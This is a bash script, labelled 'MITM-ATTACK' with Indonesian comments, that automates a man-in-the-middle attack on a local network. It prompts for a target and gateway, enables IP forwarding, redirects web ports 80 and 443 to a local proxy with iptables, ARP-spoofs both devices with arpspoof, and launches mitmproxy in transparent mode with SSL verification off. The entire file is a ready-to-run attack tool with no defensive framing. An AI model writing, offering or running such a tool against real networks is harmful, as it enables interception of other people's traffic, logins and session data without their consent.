#!/bin/bash
#

RED='\033[31;1m'
GREEN='\033[32;1m'
YELLOW='\033[33;1m'
YELIGHT='\033[0;36'
BLUE='\033[34;1m'


logo(){
printf "$RED╔╦╗╦╔╦╗╔╦╗   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═$RED\n"
printf "$RED║║║║ ║ ║║║───╠═╣ ║  ║ ╠═╣║  ╠╩╗$RED\n"
printf "$GREEN╩ ╩╩ ╩ ╩ ╩   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩$GREEN\n"
printf "\033[31;1m\t\t    Version V.1\n\n"
}


# bersih
clear
logo
# select interface
interface(){
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m type your interface\033[37;1m\n"
sleep 1
ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
read -p "$(printf "\033[34;1m(mitm)>"'\033[37;1m')" int
}
# select target
kills(){
xterm -title "starting arpspoof" -bg "#000000" -fg "#FFFFFF" -fa "Monospace" -fs 12 -e "arp-scan -l;wc" > /dev/null 2>&1 & 
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1mplease input your target\033[37;1m\n"
read -p "$(printf "\033[34;1m(mitm)target>"'\033[37;1m')" xx
read -p "$(printf "\033[34;1m(mitm)gateway/server>"'\033[37;1m')" xxx
}
# aktifkan penerusan port local port
locals(){
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
iptables -t nat -A PREROUTING -i $int -p tcp --dport 80 -j REDIRECT --to-port 8080 > /dev/null 2>&1 &
iptables -t nat -A PREROUTING -i $int -p tcp --dport 443 -j REDIRECT --to-port 8080 > /dev/null 2>&1 &
}
# aktifkan penerusan port wifi
wifi(){
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
}
# mengaktifkan arpspoof antara 2 device
active(){
xterm -title "starting arpspoof" -bg "#000000" -fg "#FFFFFF" -fa "Monospace" -fs 12 -e "arpspoof -i $int -t $xx $xxx" > /dev/null 2>&1 & 
xterm -title "starting arpspoof" -bg "#000000" -fg "#FFFFFF" -fa "Monospace" -fs 12 -e "arpspoof -i $int -t $xxx $xx" > /dev/null 2>&1 & 
}
# start mitm proxy
mitm(){
./mitmproxy --mode transparent --ssl-insecure
}
interface
kills
locals
wifi
active
mitm
